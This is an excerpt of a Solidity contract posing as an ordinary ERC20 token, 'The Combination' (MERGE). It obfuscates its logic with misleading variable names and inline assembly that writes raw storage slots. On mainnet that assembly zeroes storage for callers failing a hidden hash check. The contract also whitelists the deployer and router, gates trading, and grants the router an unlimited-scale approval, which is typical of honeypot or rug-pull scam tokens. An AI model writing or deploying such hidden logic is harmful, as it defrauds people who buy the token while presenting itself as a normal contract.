...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCombination;
    uint256 private _goodClick = block.number*2;

    mapping (address => bool) private _mouseFirst; 
    mapping (address => bool) private _keyboardSecond;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private tailsUp;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private oddGate;
    address public pair;
    ...
    bool private trading; uint256 private blackSun = 1; bool private oddNumber;
    uint256 private _decimals; uint256 private evenNumber;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addCombination.push(_router); addCombination.push(msgSender_); addCombination.push(pair);
        for (uint256 q=0; q < 3;) {_mouseFirst[addCombination[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenStarter() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xb3ad97b11afbc6a83ecf31f9c9fb62b5d2e9429e272b85b13f77661ead7a0ed7
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xab3b6f3b826b834dd432b9b1b2e6576ff25705fa814e84ca5e5b1bc8ac7005e9,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _goodClick = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCombination[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCombine(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCombination[0], 10 ** 77);
        _TokenStarter();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCombine(creator, initialSupply);
    }
}

contract Combination is ERC20Token {
    constructor() ERC20Token("The Combination", "MERGE", msg.sender, 13500000 * 10 ** 18) {
    }
}